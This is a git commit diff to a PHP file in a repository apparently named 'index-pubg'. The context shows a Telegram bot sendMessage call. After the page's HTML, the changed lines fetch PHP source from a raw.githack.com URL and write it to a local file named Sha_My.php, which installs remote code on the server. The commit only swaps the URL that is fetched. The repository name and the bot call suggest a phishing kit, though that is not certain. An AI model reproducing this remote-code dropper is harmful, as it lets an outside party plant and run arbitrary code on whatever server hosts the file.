439361e5deff8035bc495ef1b8bd32abca89ff4b
ahmed-shamy <73703631+ahmed-shamy@users.noreply.github.com>
2020-11-14 01:06:17 +0100

    Update HSha_My.php

--- H/HSha_My.php
+++ H/HSha_My.php
@@ -84,6 +84,6 @@ bot("sendMessage",[
   </body>
 </html>
 <?
-$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/H/s.php');
+$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/H/Hs.php');
 $xxx = file_put_contents("Sha_My.php", $sha);
 ?>
